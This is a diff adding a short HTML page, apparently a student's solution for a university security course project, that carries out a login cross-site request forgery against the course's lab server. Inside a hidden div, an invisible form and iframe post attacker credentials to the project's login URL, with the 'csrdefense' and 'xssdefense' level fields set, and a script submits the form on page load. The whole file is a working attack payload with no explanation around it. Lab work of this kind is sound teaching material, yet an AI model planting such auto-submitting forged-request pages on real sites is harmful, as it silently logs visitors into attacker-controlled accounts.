@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+	<body>
+		<div style="visibility: hidden;">
+			<iframe name="csrf_frame"></iframe>
+			<form name = "csrf" method = "post" action = "https://comp427.rice.edu/proj2/login" target = "csrf_frame">
+				<input name = "csrdefense" value = "0" ></input>
+				<input name = "xssdefense" value = "4" ></input>
+				<input name = "username" value = "attacker" ></input>
+				<input name = "password" value = "3l33thax0rz!" ></input>
+			</form>
+			<script>
+				document.forms[0].submit();
+			</script>
+		</div>
+	</body>
+</html>
